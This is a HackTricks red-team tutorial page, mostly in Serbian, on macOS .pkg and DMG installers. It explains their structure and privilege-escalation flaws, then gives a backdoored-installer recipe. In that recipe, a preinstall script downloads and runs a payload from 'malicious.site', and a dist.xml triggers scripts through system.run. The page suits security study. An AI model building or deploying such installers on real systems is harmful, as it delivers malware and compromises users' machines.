# macOS Installers Abuse

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Pkg Basic Information

macOS **instalacioni paket** (poznat i kao `.pkg` datoteka) je format datoteke koji koristi macOS za **distribuciju softvera**. Ove datoteke su poput **kutije koja sadrži sve što je komadu softvera** potrebno da se ispravno instalira i pokrene.

Datoteka paketa je arhiva koja sadrži **hijerarhiju datoteka i direktorijuma koji će biti instalirani na ciljni** računar. Takođe može uključivati **skripte** za obavljanje zadataka pre i posle instalacije, kao što su postavljanje konfiguracionih datoteka ili čišćenje starih verzija softvera.

### Hierarchy

<figure><img src="../../../.gitbook/assets/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

* **Distribucija (xml)**: Prilagođavanja (naslov, tekst dobrodošlice…) i provere skripti/instalacije
* **PackageInfo (xml)**: Informacije, zahtevi za instalaciju, lokacija instalacije, putevi do skripti koje treba pokrenuti
* **Bill of materials (bom)**: Lista datoteka za instalaciju, ažuriranje ili uklanjanje sa dozvolama datoteka
* **Payload (CPIO arhiva gzip kompresovana)**: Datoteke za instalaciju u `install-location` iz PackageInfo
* **Skripte (CPIO arhiva gzip kompresovana)**: Pre i post instalacione skripte i drugi resursi ekstraktovani u privremeni direktorijum za izvršavanje.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Da biste vizualizovali sadržaj instalatera bez ručnog dekompresovanja, možete koristiti besplatan alat [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

## DMG Osnovne Informacije

DMG datoteke, ili Apple Disk Images, su format datoteka koji koristi Apple-ov macOS za disk slike. DMG datoteka je u suštini **montabilna disk slika** (sadrži sopstveni fajl sistem) koja sadrži sirove blok podatke obično kompresovane i ponekad enkriptovane. Kada otvorite DMG datoteku, macOS **montira** je kao da je fizički disk, omogućavajući vam pristup njenom sadržaju.

{% hint style="danger" %}
Napomena da **`.dmg`** instalateri podržavaju **toliko formata** da su u prošlosti neki od njih koji su sadržavali ranjivosti zloupotrebljavani za dobijanje **izvršavanja kernel koda**.
{% endhint %}

### Hijerarhija

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

Hijerarhija DMG datoteke može biti različita u zavisnosti od sadržaja. Međutim, za aplikacione DMG-ove, obično prati ovu strukturu:

* Gornji nivo: Ovo je koren disk slike. Često sadrži aplikaciju i moguće link ka folderu Aplikacije.
* Aplikacija (.app): Ovo je stvarna aplikacija. U macOS-u, aplikacija je obično paket koji sadrži mnoge pojedinačne datoteke i foldere koji čine aplikaciju.
* Link do Aplikacija: Ovo je prečica do foldera Aplikacije u macOS-u. Svrha ovoga je da vam olakša instalaciju aplikacije. Možete prevući .app datoteku na ovu prečicu da instalirate aplikaciju.

## Privesc putem zloupotrebe pkg

### Izvršavanje iz javnih direktorijuma

Ako pre ili post instalacioni skript, na primer, izvršava iz **`/var/tmp/Installerutil`**, napadač može kontrolisati taj skript kako bi eskalirao privilegije svaki put kada se izvrši. Ili drugi sličan primer:

<figure><img src="../../../.gitbook/assets/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Ovo je [javna funkcija](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) koju će nekoliko instalatera i ažuriranja pozvati da **izvrši nešto kao root**. Ova funkcija prihvata **putanju** do **datoteke** koju treba **izvršiti** kao parametar, međutim, ako napadač može **modifikovati** ovu datoteku, biće u mogućnosti da **zloupotrebi** njeno izvršavanje sa root-om da **eskalira privilegije**.
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
Za više informacija pogledajte ovaj govor: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Izvršenje montiranjem

Ako instalater piše u `/tmp/fixedname/bla/bla`, moguće je **napraviti montiranje** preko `/tmp/fixedname` bez vlasnika, tako da možete **modifikovati bilo koju datoteku tokom instalacije** da biste zloupotrebili proces instalacije.

Primer za to je **CVE-2021-26089** koji je uspeo da **prepiše periodični skript** kako bi dobio izvršenje kao root. Za više informacija pogledajte govor: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg kao malware

### Prazan Payload

Moguće je samo generisati **`.pkg`** datoteku sa **pre i post-instalacionim skriptama** bez bilo kakvog pravog payload-a osim malware-a unutar skripti.

### JS u Distribution xml

Moguće je dodati **`<script>`** tagove u **distribution xml** datoteku paketa i taj kod će se izvršiti i može **izvršiti komande** koristeći **`system.run`**:

<figure><img src="../../../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>

### Installer sa backdoor-om

Zlonameran instalater koristi skriptu i JS kod unutar dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

* [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0\_zobQ)
* [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
* [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
* [https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages)

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
